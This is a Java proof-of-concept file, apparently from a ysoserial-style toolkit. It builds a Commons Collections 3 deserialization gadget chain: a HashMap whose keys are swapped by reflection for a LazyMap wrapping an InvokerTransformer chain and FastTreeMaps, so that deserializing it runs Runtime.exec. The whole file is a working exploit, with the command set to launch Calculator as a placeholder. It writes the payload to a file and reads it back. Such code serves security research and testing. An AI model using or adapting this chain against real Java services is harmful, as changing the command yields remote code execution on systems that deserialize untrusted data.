package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import com.nqzero.permit.Permit;
import org.apache.commons.collections.FastTreeMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
 * -><java.util.HashMap: java.lang.Object putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)>
 * -><org.apache.commons.collections.FastTreeMap: boolean equals(java.lang.Object)>
 * -><org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
 *     ...
 */

public class CC3_Poc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        outerMap.put(333,333);

        FastTreeMap fastTreeMap =new FastTreeMap();
        fastTreeMap.put(111,1111);

        FastTreeMap fastTreeMap1 = new FastTreeMap();
        fastTreeMap1.put(222,222);

        // Use the colliding Maps as keys in Hashtable
        HashMap hashtable = new HashMap();
        hashtable.put(1, 1);
        hashtable.put(2,2);
        hashtable.put(3, 3);


        Field tableField = hashtable.getClass().getDeclaredField("table");
        Permit.setAccessible(tableField);
        Object[] table = (Object[]) tableField.get(hashtable);
        int j = 0;
        for (int i=0;i < table.length;i++){
            Object entry1 = table[i];
            if(entry1 != null) {
                if (j==0){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, outerMap);
                    j++;
                }else if (j==1){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, fastTreeMap);
                    j++;
                }else if (j==2){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, fastTreeMap1);
                    j++;
                }

            }
        }

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(hashtable);
        outputStream.close();


//        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();
    }
}
